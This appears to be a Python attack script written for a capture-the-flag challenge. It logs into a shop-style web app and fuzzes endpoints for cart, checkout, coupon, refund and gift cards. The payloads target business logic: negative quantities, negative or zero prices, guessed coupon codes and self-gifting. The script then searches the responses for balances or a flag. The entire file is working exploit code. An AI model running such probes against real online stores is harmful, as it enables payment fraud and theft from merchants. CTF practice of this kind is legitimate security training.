import http.client, urllib.parse, time, re

BASE = "http://noneshallpass.chals.mctf.io"
parsed = urllib.parse.urlparse(BASE)

USER = "exploit_user"
PWD = "Expl0it!"


# helper to get session cookie via raw POST
def get_session():
    conn = http.client.HTTPConnection(parsed.netloc, timeout=10)
    body = urllib.parse.urlencode({"username": USER, "password": PWD})
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    conn.request("POST", "/login", body, headers)
    res = conn.getresponse()
    setcookie = res.getheader("Set-Cookie")
    data = res.read()
    conn.close()
    if not setcookie:
        print("[!] no Set-Cookie")
        return None
    m = re.search(r"session=([^;]+)", setcookie)
    if not m:
        print("[!] no session value")
        return None
    return m.group(1)


# perform a single request with cookie
def do_post(path, params, cookie=None):
    conn = http.client.HTTPConnection(parsed.netloc, timeout=10)
    body = urllib.parse.urlencode(params)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if cookie:
        headers["Cookie"] = "session=" + cookie
    try:
        conn.request("POST", path, body, headers)
        res = conn.getresponse()
        data = res.read()
        code = res.status
    except Exception as e:
        return None, None
    finally:
        conn.close()
    return code, data


# perform GET
def do_get(path, cookie=None):
    conn = http.client.HTTPConnection(parsed.netloc, timeout=10)
    headers = {}
    if cookie:
        headers["Cookie"] = "session=" + cookie
    try:
        conn.request("GET", path, headers=headers)
        res = conn.getresponse()
        data = res.read()
        code = res.status
    except Exception as e:
        return None, None
    finally:
        conn.close()
    return code, data


session = get_session()
print("[*] got session:", session[:40] if session else None)
if not session:
    raise SystemExit

# endpoints and payloads to try
endpoints = [
    "/add_to_cart",
    "/cart",
    "/update_cart",
    "/checkout",
    "/purchase",
    "/apply_coupon",
    "/coupon",
    "/cart/checkout",
    "/api/checkout",
    "/api/cart",
    "/order",
    "/refund",
    "/return",
    "/gift",
    "/gift_card",
    "/redeem",
]

payloads = [
    {"product_id": "1", "quantity": "-1"},
    {"product_id": "1", "quantity": "99999"},
    {"product_id": "1", "price": "-9999"},
    {"product_id": "1", "price": "0"},
    {"amount": "-1000"},
    {"coupon": "FREE"},
    {"coupon": "1337"},
    {"gift_to": "exploit_user", "amount": "1000"},
    {"refund_amount": "1000"},
    {"order_id": "1", "quantity": "-1"},
]

# conservative loop: try each endpoint with a few payloads
for ep in endpoints:
    print("\n-- testing", ep)
    # try GET first
    code, data = do_get(ep, session)
    print("GET", ep, "->", code)
    if data:
        print(data[:300])
    time.sleep(0.15)
    # try a small subset of payloads per endpoint
    for p in payloads[:6]:
        code, data = do_post(ep, p, session)
        print("POST", ep, "params", p, "->", code)
        if data:
            # print small preview and search for numbers/currency
            s = data.decode(errors="ignore")
            preview = s[:300]
            print(preview)
            if (
                "balance" in s.lower()
                or "$" in s
                or "1337" in s.lower()
                or "flag" in s.lower()
                or "coupon" in s.lower()
            ):
                print("!!! interesting response contains balance/currency/flag")
        time.sleep(0.12)

print("\nDone")
